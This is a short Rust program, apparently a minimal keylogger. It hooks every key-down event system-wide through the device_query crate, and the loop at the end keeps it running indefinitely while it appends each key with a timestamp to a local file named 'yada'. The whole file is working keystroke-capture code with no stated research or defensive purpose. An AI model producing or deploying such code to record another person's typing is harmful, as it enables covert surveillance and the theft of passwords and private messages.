use device_query::{DeviceEvents, DeviceState};
use chrono::Utc;
use std::io::Write;
use std::fs;

fn main() {
    let device_state = DeviceState::new();
    
    let _guard = device_state.on_key_down(|key| {
        let printable = Utc::now().to_string() + " " + &key.to_string()[..];
        let mut file = fs::OpenOptions::new()
            .write(true)
            .append(true)
            .create(true)
            .open("yada")
            .expect("failed to open file");
        writeln!(file, "{}", printable).unwrap();
    });

    loop {}
}
